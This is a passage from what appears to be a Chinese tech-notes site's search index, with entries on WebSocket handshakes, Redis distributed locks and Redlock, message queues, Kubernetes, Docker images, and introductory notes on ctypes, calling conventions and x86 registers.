Sec-Websocket-key WebSocket握手过程中的一个关键消息头. 标识这是一个WebSocket连接请求,而不是普通的HTTP请求 用来计算Sec-WebSocket-Accept的值,以验证连接.\n在WebSocket握手时,客户端发送一个请求到服务器,请求中包含一个随机生成的Sec-WebSocket-Key.\n服务器收到这个key后,需要按照一定算法计算出一个hash值,放到Sec-WebSocket-Accept响应头中返回给客户端.\n客户端收到响应后,会用相同的算法计算hash值,并比对是否和服务器返回的一致。如果一致,则说明服务器支持WebSocket,握手成功.\n这个过程可以防止普通HTTP客户端意外接入WebSocket服务器.","tags":"计算机网络","url":"/yq-docs-Chaotic-computer-network-websocket.html","loc":"/yq-docs-Chaotic-computer-network-websocket.html"},{"title":"分布式锁","text":"参考: Redis 分布式锁的正确实现原理演化历程与 Redisson 实战总结 分布式锁应该满足哪些特性 互斥：在任何给定时刻，只有一个客户端可以持有锁； 无死锁：任何时刻都有可能获得锁，即使获取锁的客户端崩溃； 容错：只要大多数 Redis的节点都已经启动，客户端就可以获取和释放锁。 如何设置? 普通排他锁 利用 redis 的特性:\n使用 SETNX key value 命令是实现「互斥」特性 如获取一个订单锁: 127.0.0.1:6379> setnx lock:order_1 1\n(integer) 1 重复获取就失败: 127.0.0.1:6379> setnx lock:order_1 2\n(integer) 0 但是会存在一个问题, 会出现如果客户端异常, 锁无法释放,\n就会有死锁. 这个时候可以设置超时, 如30秒过期: 127.0.0.1:6379> expire lock:order_1 30\n(integer) 1 但是这样写有个问题, 因为是两个命令, 不能保证同时执行成功(原子性) 所有可以这样写: 127.0.0.1:6379> set lock:order_1 1 NX EX 30\nOK 这样写还不够，我们还要防止不能释放不是自己加的锁, 比如是A设置的,\nB给del了. 考虑以下场景: A 获取锁成功并设置设置 30 秒超时； A 因为一些原因导致执行很慢（网络问题、发生 FullGC……），过了 30 秒依然没执行完，但是锁过期「自动释放了」； B 申请加锁成功； A 执行完成，执行 DEL 释放锁指令，这个时候就把 B 的锁给释放了。 有个关键问题需要解决：自己的锁只能自己来释放 这个时候可以从value上入手, 比如设置其前缀为自己的标识, del前检查一下是不是自己的锁 这个时候已经比较完美了, 一般都是如此使用 正确设置锁超时 锁的超时时间怎么计算合适呢？ 这个时间不能瞎写，一般要根据在测试环境多次测试，然后压测多轮之后，比如计算出平均执行时间 200 ms。\n那么锁的超时时间就放大为平均执行时间的 3~5 倍。 为啥要放放大呢？ 因为如果锁的操作逻辑中有网络 IO 操作、JVM FullGC 等，线上的网络不会总一帆风顺，我们要给网络抖动留有缓冲时间。 那我设置更大一点，比如设置 1 小时不是更安全？ 不要钻牛角，多大算大？ 设置时间过长，一旦发生宕机重启，就意味着 1 小时内，分布式锁的服务全部节点不可用。\n你要让运维手动删除这个锁么？\n只要运维真的不会打你。 有没有完美的方案呢？不管时间怎么设置都不大合适。 我们可以让获得锁的线程开启一个守护线程，用来给快要过期的锁「续航」。 加锁的时候设置一个过期时间，同时客户端开启一个「守护线程」，定时去检测这个锁的失效时间。 如果快要过期，但是业务逻辑还没执行完成，自动对这个锁进行续期，重新设置过期时间。 这个道理行得通，可我写不出。 别慌，已经有一个库把这些工作都封装好了他叫 Redisson .\n在使用分布式锁时，它就采用了 自动续期 的方案来避免锁过期，这个守护线程我们一般也把它叫做 看门狗 线程。 一路优化下来，方案似乎比较「严谨」了，抽象出对应的模型如下 通过 SET lock_resource_name random_value NX EX expire_time，同时启动守护线程为快要过期但还没执行完的客户端的锁续命; 客户端执行业务逻辑操作共享资源； 通过脚本释放锁，先 get 判断锁是否是自己加的，再执行 DEL。 但是还是有以下问题 可重入锁如何实现？ 主从架构崩溃恢复导致锁丢失如何解决？ 客户端加锁的位置有门道么？ 实现可重入锁 当一个线程执行一段代码成功获取锁之后，继续执行时，\n又遇到加锁的代码，可重入性就就保证线程能继续执行，\n而不可重入就是需要等待锁释放之后，再次获取锁成功，才能继续往下执行。 Redis Hash 可重入锁 Redisson 类库就是通过 Redis Hash 来实现可重入锁 当线程拥有锁之后，往后再遇到加锁方法，直接将加锁次数加 1，然后再执行方法逻辑。 退出加锁方法之后，加锁次数再减 1，当加锁次数为 0 时，锁才被真正的释放。 可以看到可重入锁最大特性就是计数，计算加锁的次数。 所以当可重入锁需要在分布式环境实现时，我们也就需要统计加锁次数。 大致逻辑: 首先 Redis exists 命令判断当前 lock 这个锁是否存在 如果锁不存在的话，直接使用 hincrby 创建一个键为 lock hash 表，\n并且为 Hash 表中键为 uuid 初始化为 0，然后再次加 1，最后再设置过期时间 如果当前锁存在，则使用 hexists 判断当前 lock 对应的 hash 表中是否存在 uuid 这个键，\n如果存在，再次使用 hincrby 加 1，最后再次设置过期时间 最后如果上述两个逻辑都不符合，说明别人拿了锁. 主从架构带来的问题 之前分析的场景都是，锁在「单个」Redis 实例中可能产生的问题，并没有涉及到 Redis 主从模式导致的问题。\n我们通常使用「Cluster 集群」或者「哨兵集群」的模式部署保证高可用。 这两个模式都是基于「主从架构数据同步复制」实现的数据同步，而 Redis 的主从复制默认是异步的。 以下内容来自于官方文档 Redis官方 我们试想下如下场景会发生什么问题： 客户端 A 在 master 节点获取锁成功。 还没有把获取锁的信息同步到 slave 的时候，master 宕机。 slave 被选举为新 master，这时候没有客户端 A 获取锁的数据。 客户端 B 就能成功的获得客户端 A 持有的锁，违背了分布式锁定义的互斥。 虽然这个概率极低，但是我们必须得承认这个风险的存在。 ❝Redis 的作者提出了一种解决方案，叫 Redlock（红锁） Redis 的作者为了统一分布式锁的标准，搞了一个 Redlock，\n算是 Redis 官方对于实现分布式锁的指导规范, Redis官方 ,\n但是这个 Redlock 也被国外的一些分布式专家给喷了。\n因为它也不完美，有\"漏洞\"。 什么是 Redlock 可以看官方文档( Redis官方 )，以下来自官方文档的翻译。 想用使用 Redlock，官方建议在不同机器上部署 5 个 Redis 主节点，\n节点都是完全独立，也不使用主从复制，使用多个节点是为容错。\n一个客户端要获取锁有 5 个步骤： 客户端获取当前时间 T1（毫秒级别）； 使用相同的 key和 value顺序尝试从 N个 Redis实例上获取锁。 每个请求都设置一个超时时间（毫秒级别），该超时时间要远小于锁的有效时间，这样便于快速尝试与下一个实例发送请求。\n比如锁的自动释放时间 10s，则请求的超时时间可以设置 5~50 毫秒内，这样可以防止客户端长时间阻塞。 客户端获取当前时间 T2 并减去步骤 1 的 T1 来计算出获取锁所用的时间（T3 = T2 -T1）。\n当且仅当客户端在大多数实例（N/2 + 1）获取成功，且获取锁所用的总时间 T3 小于锁的有效时间，才认为加锁成功，否则加锁失败。 如果第 3 步加锁成功，则执行业务逻辑操作共享资源，\nkey 的真正有效时间等于有效时间减去获取锁所使用的时间（步骤 3 计算的结果）。 如果因为某些原因，获取锁失败（没有在至少 N/2+1 个 Redis 实例取到锁或者取锁时间已经超过了有效时间），\n客户端应该在所有的 Redis 实例上进行解锁（即便某些 Redis 实例根本就没有加锁成功）。 另外部署实例的数量要求是奇数，为了能很好的满足过半原则，\n如果是 6 台则需要 4 台获取锁成功才能认为成功，所以奇数更合理 事情可没这么简单，Redis 作者把这个方案提出后，受到了业界著名的分布式系统专家的质疑。\n两人好比神仙打架，两人一来一回论据充足的对一个问题提出很多论断……: • Martin Kleppmann 提出质疑的博客：https://martin.kleppmann.com/2016/02/08/how-to-do-distributed-locking.html\n• Redlock 设计者的回复：http://antirez.com/news/101 Redlock 是与非 Martin Kleppmann 认为锁定的目的是为了保护对共享资源的读写，而分布式锁应该「高效」和「正确」 高效性：分布式锁应该要满足高效的性能，Redlock 算法向 5 个节点执行获取锁的逻辑性能不高，成本增加，复杂度也高； 正确性：分布式锁应该防止并发进程在同一时刻只能有一个线程能对共享数据读写。 出于这两点，我们没必要承担 Redlock 的成本和复杂，运行 5 个 Redis 实例并判断加锁是否满足大多数才算成功。\n主从架构崩溃恢复极小可能发生，这没什么大不了的。使用单机版就够了，Redlock 太重了，没必要。 Martin 认为 Redlock 根本达不到安全性的要求，也依旧存在锁失效的问题！ Martin 的结论 Redlock 不伦不类：对于偏好效率来讲，Redlock 比较重，没必要这么做，而对于偏好正确性来说，Redlock 是不够安全的。 时钟假设不合理：该算法对系统时钟做出了危险的假设（假设多个节点机器时钟都是一致的），如果不满足这些假设，锁就会失效。 无法保证正确性：Redlock 不能提供类似 fencing token 的方案，所以解决不了正确性的问题。为了正确性，请使用有「共识系统」的软件，例如 Zookeeper。 Redis 作者 Antirez 的反驳 在 Redis 作者的反驳文章中，有 3 个重点： 时钟问题：Redlock 并不需要完全一致的时钟，只需要大体一致就可以了，允许有「误差」，\n只要误差不要超过锁的租期即可，这种对于时钟的精度要求并不是很高，而且这也符合现实环境。 网络延迟、进程暂停问题： 客户端在拿到锁之前，无论经历什么耗时长问题，Redlock 都能够在第 3 步检测出来 客户端在拿到锁之后，发生 NPC，那 Redlock、Zookeeper 都无能为力 质疑 fencing token 机制。 Redisson 分布式锁","tags":"中间件","url":"/yq-docs-Chaotic-middleware-Distributed-lock.html","loc":"/yq-docs-Chaotic-middleware-Distributed-lock.html"},{"title":"Dubbo","text":"一个RPC框架 注册中心 服务注册 服务发现","tags":"中间件","url":"/yq-docs-Chaotic-middleware-Dubbo.html","loc":"/yq-docs-Chaotic-middleware-Dubbo.html"},{"title":"RocketMQ","text":"如何避免消息丢失 方案一：同步发送＋多次重试 DefaultMQProducer发送消息的方式 单向发送：消息发出去就不管了 同步发送：同步等待Broker响应 异步发送：异步处理Broker通知 重试队列与死信队列保证消息安全 方案二：RocketMQ提供的事务消息机制 TransactionMQProducer + TransactionListenerImpl\n实现事务消息发送 关于缓存写到磁盘 RocketMQ 同步刷盘, 每10毫秒进行一次刷盘; 异步刷盘， 如果是堆内内存，可以设定刷盘的间隔; 堆外内存，只管写入pagecache，由操作系统进行刷盘。 注解 pagecache 指内核态的页缓存 整个链路保障消息一致 如果每一个地方都要保障消息不丢失, 性能会下降,\n甚至还不如不用MQ. 所以, 综合考虑使用场景...","tags":"中间件","url":"/yq-docs-Chaotic-middleware-Mq-Rocketmq.html","loc":"/yq-docs-Chaotic-middleware-Mq-Rocketmq.html"},{"title":"MQ","text":"RocketMQ 主要是适用于分布式微服务场景下的,\n单体小业务用不到. 消息队列（Message Queue，简称MQ）指保存消息的一个容器，其实本质就是一个保存数据的队列; 消息中间件是指利用高效可靠的消息传递机制进行与平台无关的数据交流，并基于数据通信来进行分布式系统的构建 消息中间件是分布式系统中重要的组件，主要解决应用解耦，异步消息，流量削峰等问题，\n实现高性能，高可用，可伸缩和最终一致性的系统架构。\n目前使用较多的消息队列有ActiveMQ，RabbitMQ，ZeroMQ，Kafka，MetaMQ，RocketMQ等。 主要用途 解耦 将原来单体量应用拆分为分布式微服务架构, 通过MQ消息队列通信,\n提高可维护性. 系统之间耦合转移为与MQ的耦合 异步 避免完全串行化, 提高效率 削峰 当某个时段请求量, 并发量大时, 给到消息队列里面去, 慢慢处理,\n不至于被搞挂掉. 异步解耦举例 在正常业务流程中，比较耗时而且不需要即时返回结果的操作。\n将这些操作可以做为「异步处理」，这样可以大大的加快请求的响应时间。 最常见的场景就是用户注册之后，需要发送注册短信、邮件通知，以告知相关信息。 正常做法，是要经过三大步处理：用户信息处理、发送邮件、发送短信，\n等这三步全部都完成之后，才返回前端，告诉你注册成功了。 使用MQ，只需要在处理完用户信息之后，\n给MQ发送两个消息即可，邮件服务、短信服务监听MQ的任务消息，根据消息进行发送即可。 解耦微服务举例 还是用户注册的例子，将用户注册、邮件/短信发送理解为两个独立的微服务，就非常好理解 流量削峰填谷 控制流量，也是MQ比较常用的一个场景，一般在秒杀、搞活动中使用广泛。\n这个时候一般用户请求量会激增，可能会远超当前系统的最大处理量，如果不做任何处理，系统可能就会宕掉。 使用MQ，可以将需要处理的消息全部放入其中，系统按照最大处理能力，\n去获取消息进行消费，这样就可以将一瞬间过来的请求，分散到一段时间内进行处理，避免了系统的崩溃。 消息分发 这个也挺常用。多个系统对同一个数据感兴趣，只需要监听同一类消息即可。 例如付款系统，在付款成功之后，正常做法是通知外围系统这个单子付款成功了，\n或者是外围系统定时来拉取付款结果，\n使用MQ后，付款系统可以在付款成功之后，将消息放到MQ里面，\n想知道这个结果的系统订阅这个主题的消息即可，非常方便，也不需要定时去拉取数据了。 事务消息发送步骤如下 发送方将半事务消息发送至消息队列RocketMQ。 消息队列RocketMQ将消息持久化成功之后，向发送方返回Ack确认消息已经发送成功，此时消息为半事务消息。 发送方开始执行本地事务逻辑。 发送方根据本地事务执行结果向服务端提交二次确认（Commit或是Rollback），\n服务端收到Commit状态则将半事务消息标记为可投递，订阅方最终将收到该消息；\n服务端收到Rollback状态则删除半事务消息，订阅方将不会接受该消息。 事务消息回查步骤如下： 在断网或者是应用重启的特殊情况下，\n上述步骤4提交的二次确认最终未到达服务端，经过固定时间后服务端将对该消息发起消息回查。 发送方收到消息回查后，需要检查对应消息的本地事务执行的最终结果。 发送方根据检查得到的本地事务的最终状态再次提交二次确认，服务端仍按照步骤4对半事务消息进行操作。 缺点 系统可用性降低 系统可用性在某种程度上降低。在加入MQ之前，\n你不用考虑消息丢失或者说MQ挂掉等等的情况，但是，引入MQ之后你就需要去考虑了！ 系统复杂性提高 重复消费、消息丢失、消息的顺序消费等等，反正用了之后就是贼烦。 数据一致性 分布式服务本身就存在的一个问题，不仅仅是消息队列的问题，\n但是放在这里说是因为用了消息队列这个问题会暴露得比较严重一点 有一个解决方案是 分布式事务 :\n把相关操作如 下单，优惠券，积分。。。 都放在一个事务里面一样，要成功一起成功，要失败一起失败。 消息队列MQ设计 大致流程: Producer  ----send---->  Broker ----receive---->  Consumer\n\n                                消息存储\n                                  --消息消费-->\n                                  <--消息确认--\n                                消息备份/删除 Producer 消息生产者：负责产生和发送消息到 Broker； Broker 消息处理中心：负责消息存储、确认、重试等，一般其中会包含多个 queue； Consumer 消息消费者：负责从 Broker 中获取消息，并进行相应处理； 分类 Kafka ActiveMQ RabbitMQ RocketMQ 等这几种 ActiveMQ和RabbitMQ这两着因为吞吐量还有GitHub的社区活跃度的原因，\n在各大互联网公司都已经基本上绝迹了，\n业务体量一般的公司会是有在用的，\n但是越来越多的公司更青睐RocketMQ这样的消息中间件了。 没有最好的技术，只有最适合的技术，不要为了用而用 ActiveMQ 优点 单机吞吐量：万级 时效性：ms级 可用性：高，基于主从架构实现高可用性 消息可靠性：有较低的概率丢失数据 功能支持：MQ领域的功能极其完备 缺点: 官方社区现在对ActiveMQ 5.x维护越来越少，较少在大规模吞吐的场景中使用。 Kafka 号称大数据的杀手锏，谈到大数据领域内的消息传输，则绕不开Kafka，\n这款为大数据而生的消息中间件，以其百万级TPS的吞吐量名声大噪，\n迅速成为大数据领域的宠儿，在数据采集、传输、存储的过程中发挥着举足轻重的作用。 Apache Kafka它最初由LinkedIn公司基于独特的设计实现为\n一个分布式的提交日志系统( a distributed commit log)，之后成为Apache项目的一部分。 目前已经被LinkedIn，Uber, Twitter, Netflix等大公司所采纳。 优点 性能卓越，单机写入TPS约在百万条/秒(集群, 单机只有十万)，最大的优点，就是吞吐量高。 时效性：ms级 可用性：非常高，kafka是分布式的，一个数据多个副本，少数机器宕机，不会丢失数据，不会导致不可用 消费者采用Pull方式获取消息, 消息有序, 通过控制能够保证所有消息被消费且仅被消费一次; 有优秀的第三方Kafka Web管理界面Kafka-Manager； 在日志领域比较成熟，被多家公司和多个开源项目使用； 功能支持：功能较为简单，主要支持简单的MQ功能，在大数据领域的实时计算以及日志采集被大规模使用 缺点： Kafka单机超过64个队列/分区，Load会发生明显的飙高现象，队列越多，load越高，发送消息响应时间变长 使用短轮询方式，实时性取决于轮询间隔时间； RabbitMQ RabbitMQ 2007年发布，是一个在AMQP(高级消息队列协议)基础上完成的，\n可复用的企业消息系统，是当前最主流的消息中间件之一。 RabbitMQ优点： 由于erlang语言的特性，mq 性能较好，高并发； 吞吐量到万级，MQ功能比较完备 健壮、稳定、易用、跨平台、支持多种语言、文档齐全； 开源提供的管理界面非常棒，用起来很好用 社区活跃度高； RabbitMQ缺点： erlang开发，很难去看懂源码，基本只依赖于开源社区的快速维护和修复bug，不利于做二次开发和维护。 RabbitMQ确实吞吐量会低一些，这是因为他做的实现机制比较重。 需要学习比较复杂的接口和协议，学习和维护成本较高。 RocketMQ RocketMQ出自 阿里公司的开源产品，用 Java 语言实现，在设计时参考了 Kafka，并做出了自己的一些改进。 RocketMQ在阿里集团被广泛应用在订单，交易，充值，流计算，消息推送，日志流式处理，binglog分发等场景。 RocketMQ优点： 单机吞吐量：十万级 可用性：非常高，分布式架构 消息可靠性：经过参数优化配置，消息可以做到0丢失 功能支持：MQ功能较为完善，还是分布式的，扩展性好 支持10亿级别的消息堆积，不会因为堆积导致性能下降 源码是java，我们可以自己阅读源码，定制自己公司的MQ，可以掌控 RocketMQ缺点： 支持的客户端语言不多，目前是java及c++，其中c++不成熟； 社区活跃度一般 没有在 mq 核心中去实现JMS等接口，有些系统要迁移需要修改大量代码 消息队列选择建议 Kafka Kafka主要特点是基于Pull的模式来处理消息消费，追求高吞吐量，\n一开始的目的就是用于日志收集和传输，适合产生大量数据的互联网服务的数据收集业务。 大型公司建议可以选用，如果有日志采集功能，肯定是首选kafka了。 RocketMQ 天生为金融互联网领域而生，对于可靠性要求很高的场景，\n尤其是电商里面的订单扣款，以及业务削峰，在大量交易涌入时，后端可能无法及时处理的情况。 RoketMQ在稳定性上可能更值得信赖，这些业务场景在阿里双11已经经历了多次考验，\n如果你的业务有上述并发场景，建议可以选择RocketMQ。 RabbitMQ 结合erlang语言本身的并发优势，性能较好，社区活跃度也比较高，但是不利于做二次开发和维护。\n不过，RabbitMQ的社区十分活跃，可以解决开发过程中遇到的bug。 如果你的数据量没有那么大，小公司优先选择功能比较完备的RabbitMQ。 参考 秒懂消息队列MQ，万字总结带你全面了解消息队列MQ 消息队列（MQ）到底能干什么？ 深入消息队列MQ，看这篇就够了！","tags":"中间件","url":"/yq-docs-Chaotic-middleware-Mq-index.html","loc":"/yq-docs-Chaotic-middleware-Mq-index.html"},{"title":"中间件","text":"消息队列 MQ 分布式锁 Dubbo 为什么要使用 异步 同步的事件驱动转为异步的消息驱动 解藕 不同技术、不同语言之间系统对接 削峰 用稳定的系统资源处理突发的流量冲击","tags":"中间件","url":"/yq-docs-Chaotic-middleware-index.html","loc":"/yq-docs-Chaotic-middleware-index.html"},{"title":"消息队列","text":"rabbitmq地址: AMQP 0-9-1 Protocol 此文主要介绍 AMQP (Advanced Message Queuing Protocol) 协议: 高级消息队列协议 设计目标: 让服务端可通过协议编程 组成: 网络协议 服务端服务 包含: 高级消息队列协议模型(AMQ Model) 网络层协议AMQP, 让客户端程序与实现了AMQ Model的服务端进行通信 AMQP协议是一个二进制协议，具有一些现代特性: 多通道（multi-channel） 可协商（negotiated） 异步 安全 便携 语言中立 高效 基本的AMQP模型: |   Exchange          Queue     |\n发布者 ->      |    交换机    ->    Msg Queue   |  -> 消费者\nPublisher     |                               |     Consumer\n              |         AMQP Model            | 消息由交换机路由给消息队列 没来得及看的一些文章:: 一篇文章讲透彻了AMQP协议 AMQP 协议详解 RabbitMQ MQTT协议和AMQP协议 AMQP 入门","tags":"中间件","url":"/yq-docs-Chaotic-middleware-message-queue.html","loc":"/yq-docs-Chaotic-middleware-message-queue.html"},{"title":"Kubernetes","text":"官网主页: Kubernetes 文档 集群安装 k8s集群演变: 单体应用 --> 前后端分离 --> 微服务 --> 容器（貌似单体应用就有了） --> k8s容器集群 k8s大体架构: ingress （流量进入）\ningress pod (一般是nginx分发)\n\nfront-end service (前端)                backend service （后端）\npod1 pod2                                             pod5 纯容器集群的问题 业务容器数量庞大，哪些容器部署在哪些节点，使用了哪些端口，如何记录、管理 跨主机通信，多个机器中的容器之间相互调用如何做，iptables规则手动维护？ 跨主机容器间互相调用，配置如何写？写死固定IP+端口？ 如何实现业务高可用？多个容器对外提供服务如何实现负载均衡？ 容器的业务中断了，如何可以感知到，感知到以后，如何自动启动新的容器？ 如何实现滚动升级保证业务的连续性？ 集群管理 因为 纯容器集群的问题 , 所以有了集群管理工具 Docker Swarm Mesos Google Kubernetes 2017年开始 Kubernetes 凭借强大的容器集群管理功能，逐步占据市场，目前在容器编排领域一枝独秀 k8s 架构 分布式系统，两类角色 管理节点master 工作节点worker(或者slave) 架构图 k8s 核心组件 主要是针对管理结点 ApiServer APJ服务器，集群资源访问控制入口，提供reStAPJ及安全访问控制 ETCD 分布式高性能键值数据库，存储整个集群的所有元数据 Scheduler 调度器，负责把业务容器调度到最合适的Node节点 Controller Manager 控制器管理，确保集群资源按照期望的方式运行 Replication Controller Node controller ResourceQuota Controller Namespace Controller ServiceAccount Controller Token Controller Service Controller Endpoints Controller kubelet 运行在每个节点上的主要的\"节点代理\"，脏活累活(Docker主要是在这) pod 管理 kubelet 定期从所监听的数据源获取节点上pod/container 的\n期望状态（运行什么容器、运行的副本数量、网络或者存储如何配置等等），\n并调用对应的容器平台接口达到这个状态。 容器健康检查 kubelet 创建了容器之后还要查看容器是否正常运行，\n如果容器运行出错，就要根据 pod 设置的重启策略进行处理. 容器监控 kubelet 会监控所在节点的资源使用情况，并定时向 master 报告，\n资源使用数据都是通过 GAdvisor 获取的。\n知道整个集群所有节点的资源情况，对于 pod 的调度和正常运行至关重要 kube-proxy 维护节点中的iptables或者ipvs规则 Kubectl 命令行接口，用于对 Kubernetes 集群运行命令 https://kubernetes.io/zh/docs/reference/kubect!/ 工作流程","tags":"容器与集群","url":"/yq-docs-Container-and-cluster-K8S-index.html","loc":"/yq-docs-Container-and-cluster-K8S-index.html"},{"title":"好用的docker仓库","text":"⭐️ webmin , 控制面板 ⭐️ jellyfin , 媒体服务器 aliyun-webdav, 阿里云盘webdva ⭐️ ariang：下载机 emqx ：Mqtt服务中心，工作环境偶尔用 kms：服务器 激活自己和朋友的windows+office nastools ：管理界面（不好用，废弃掉） onthing ：网心云，带宽赚钱（废弃掉，不缺这每天2块钱） ⭐️ photoprism ：照片管理工具，可以上传照片，但没必要 ftp ：开启ftp服务器（不常用） nginx ：部署项目，代理一些本地文件 ⭐️ autoBangumi ：自动追番 arsenal（武器库）： 提供一个webhook，调用即可发送邮件，用自己的域名发送，接入阿里云DDNS功能 webmin 控制面板, 拉取: docker pull johanp/webmin 默认配置: Username: root\n\nPassword: password hubdocker地址: johanp/webmin 还有samba管理, bind ( docker-bind部署dns-管理面板 ) 等相关的 jellyfin 媒体服务器 拉取: docker pull linuxserver/jellyfin 地址: linuxserver/jellyfin","tags":"容器与集群","url":"/yq-docs-Container-and-cluster-docker-The-easy-to-use-Docker-warehouse.html","loc":"/yq-docs-Container-and-cluster-docker-The-easy-to-use-Docker-warehouse.html"},{"title":"docker仓库","text":"./docker_store","tags":"容器与集群","url":"/yq-docs-Container-and-cluster-docker-docker-warehouse.html","loc":"/yq-docs-Container-and-cluster-docker-docker-warehouse.html"},{"title":"仓库搜集","text":"mysql","tags":"容器与集群","url":"/yq-docs-Container-and-cluster-docker-docker_store-index.html","loc":"/yq-docs-Container-and-cluster-docker-docker_store-index.html"},{"title":"docker","text":"docker简介 docker使用 docker安装kali docker常用指令 docker配置镜像 docker容器化下的协作 windows安装Ubuntu dockerfile编写 docker仓库 docker-compose 一些坑 好用的docker仓库 教程","tags":"容器与集群","url":"/yq-docs-Container-and-cluster-docker-index.html","loc":"/yq-docs-Container-and-cluster-docker-index.html"},{"title":"docker教程","text":"gitlab-docker配置 gitlab-docker下版本升级流程","tags":"容器与集群","url":"/yq-docs-Container-and-cluster-docker-turorial-index.html","loc":"/yq-docs-Container-and-cluster-docker-turorial-index.html"},{"title":"nginx","text":"概念详解 指令 配置 与其他产品对比 docker部署nginx","tags":"容器与集群","url":"/yq-docs-Container-and-cluster-nginx-index.html","loc":"/yq-docs-Container-and-cluster-nginx-index.html"},{"title":"常见漏洞","text":"SQL注入 XSS攻击 CSRF攻击 DDoS攻击 DNS劫持 JSON劫持 暴力破解","tags":"安全","url":"/yq-docs-Safety-Common-loopholes-index.html","loc":"/yq-docs-Safety-Common-loopholes-index.html"},{"title":"Python灰帽子","text":"前言: 此文源于书籍 Python灰帽子 ,\n不过这本书有点老了, 是基于 Python2.5 的,\n我阅读的时候尽量转换为 Python3 来记录. 安装相关 Python安装部分跳过. 很简单 2024推荐工具: Pycharm (原文是Eclipse, 很强但有点过时了) 最重要的库 Ctypes , 可参考: ctypes Ctypes使用动态库 使用 ctypes 的第一步就是明白如何解析和访问动态链接库中的函数。一个 dynamically\nlinked library（被动态连接的库）其实就是一个二进制文件，不过一般自己不运行，而是由别\n的程序调用执行。 在 Windows 上叫做 dynamic link libraries （DLL）动态链接库 ，\n在 Linux上叫做 shared objects（SO）共享库 。无 论什么平台，这些库中的函数都必须通过导出的名字调用，\n之后再在内存中找出真正的地址。所以正常情况下，要调用函数，都必须先解析出函数地址，\n不过 ctypes 替我们完成了这一步。 ctypes 提供了三种方法调用动态链接库： cdll0 windllO oledll0 它们的不同之处就在于，函数的调用方法和返回值。 cdllO加载的库，其导出的函数必须使用标准的 cdedl调用约定。 windI0方法加载的库，其导出的函数必须使用 stdcall调用约定（Win32API 的原生约定） oledl0方法和windIlO类似，不过如果函数返回一个 HRESULT错误代码，可以使用COM函数得到具体的错误信息。 调用约定 调用约定专指函数的调用方法。\n其中包括，函数参数的传递方法，顺序（压入栈或者传给寄存器），\n以及函数返回时，栈的平衡处理。 下面这两种约定是我们最常用到的： cdecl : cdecl 调用约定，函数的参数从右往左依次压入栈内，\n函数的调用者，在函数执行完成后，负责函数的平衡。这种约定常用于x86 架构的C语言里。 stdcall cdecl 例子: InC : int python_rocks（reason_one, reason_two, reason_three）； In x86 Assembly : push reason_three\npush reason_two\npush reason_one\ncall python_rocks\nadd esp, 12 从上面的汇编代码中，可以清晰的看出参数的传递顺序，最后一行，栈指针增加了\n12 个字节（三个参数传递个函数，每个被压入栈的指针都占 4 个字节，共12个），\n使得函数调用之后的栈指针恢复到调用前的位置。 下面是个 stdcall 调用 约定的了例子，用于 Win32 API。 InC : int my_socks（color_one color_two, color_three）； In x86 Assembly : push color_three\npush color_two\npush color_one\ncall my_socks 这个例子里，参数传递的顺序也是从右到左，\n不过栈的平衡处理由函数 my_socks自己完成，而不是调用者(没有 esp(栈顶指针) 调整指针)。 最后一点， 这两种调用方式的返回值都存储在 EAX 中 。 构造C数据类型 见 ctypes 调试器构造 白盒调试 正常源码开发时, 利用编辑器比如Pycharm自带的调试器进行调试 黑盒调试 不知道源码, 只知道反编译之后的汇编, 利用汇编调试工具进行调试 一般分为 用户模式: 以用户的身份;\n相关工具: WinDbg(微软生产), OllyDbg(免费程序), gdb;\nPyDbg; Immunity Debugger(界面友好, 类似OllyDbg) 内核模式: 与底层交互 X86八个通用寄存器(具体说明可参考: 汇编 ): EAX, EDX, ECX, ESI, EDI, EBP, ESP 和 EBX 寄存器说明 EAX 寄存器(Extended Accumulator, 扩展累加器) 也叫做 累加寄存器 ，除了用于存储函数的返回值外也用于执行计算的操作。\n许多优化的 x86指令集都专门设计了针对 EAX 寄存器的读写和计算指令。\n列如从最基本的加减，比较到特殊的乘除操作都有专门的EAX优化指令。 前面我们说了，函数的返回值也是存储在EAX寄存器里。\n这一点很重要，因为通过返回的EAX 里的值我们可以判断函数是执行成功与否，或者得到确切返回值。 EDX 寄存器 (Extended Data, 扩展数据) 也叫做数据寄存器。这个寄存器从本质上来说是EAX 寄存器的延伸，\n它辅助 EAX完成更多复杂的计算操作像乘法和除法。\n它虽然也能当作通用寄存器使用，不过更多的是结合EAX 寄存器进行计算操作。 ECX寄存器(Extended Counter, 扩展计数器) 也叫做计数寄存器，用于循环操作，比如重复的字符存储操作，或者数字统计。\n有一点很重要，ECX寄存器的计算是向下而不是向上的（简单理解就是用于循环操作时是由大减到小的）。 如一下Python片段: counter = 0\nwhile counter < 10:\n  print(counter)\n  counter += 1 如果你把这代码转化成汇编代码，你会看到第一轮的时候ECX 将等于 10，\n第二轮的时候等于9，如此反复知道ECX 减少到0。\n这很容易让人困惑，因这和 Python 的循环刚好代码相反，但是只要记得ECX 是向下计算的就行了。 在x86汇编里，依靠 ESI 和 EDI 寄存器能对需要循环操作的数据进行高效的处理。 ESI 寄存器(Extended Source Index, 扩展源索引) 是源操作数指针，存储着输入的数据流的位置。\nESI （source index）用于读 EDI 寄存器(Extended Destination Index, 扩展目标索引) 是目的操作数指针，存储了计算结果存储的位置。\nEDI （destination index）用于写。 用源操作数指针和目的操作数指针，极大的提高了程序处理数据的效率。 ESP(Extended Stack Pointer, 扩展堆栈指针) 和 EBP(Extended Base Pointer, 扩展基址指针) 分别是栈指针和基指针.\n这两个寄存器共同负责函数的调用和栈的操作。\n当一个函数被调用的时候，函数需要的参数被陆续压进栈内最后函数的返回地址也被压进。\nESP指着栈顶，也就是返回地址。\nEBP 则指着栈的底端。有时候，编译器能够做出优化，释放EBP，使其不再用于栈的操作，只作为普通的寄存器使用。 EBX(Extended Base, 扩展基址) 唯一一个没有特用途的寄存器。它能够作额外的数据储存器。 EIP(Extended Instruction Pointer, 扩展指令指针) 总是指向马上要执行的指令。\n当CPU执行一个程序的成千上万的代码的时候，EIP 会实时的指向当前CPU马上要执行到的位置。 一个调试器必须能够很方便的获取和修改这些寄存器的内容。\n每一个操作系统都提供了一个接口让调试器和 CPU 交互，以便能够获取和修改这些值。 注解 a(Accumulator), 8位累加器。8080。b 基址，c 计数，d数据 ax(Accumulator)，16位累加器，由ah，al 组成。8086。bx=bh+bl,cx=ch+cl,dx=dh+dl eax(Extended Accumulator)，32位累加器，80386 rax(Return Accumulator)，64位累加器。X86-64 关于X的解释: 最早的x86的累加寄存器叫ax, 高位為ah, 低位為al, 拼在一起叫ax.\nIA-32時代以后叫eax, 擴展(extend)為32位, 這個e就是extend, a是accumulate, x其實是h加l的意思, 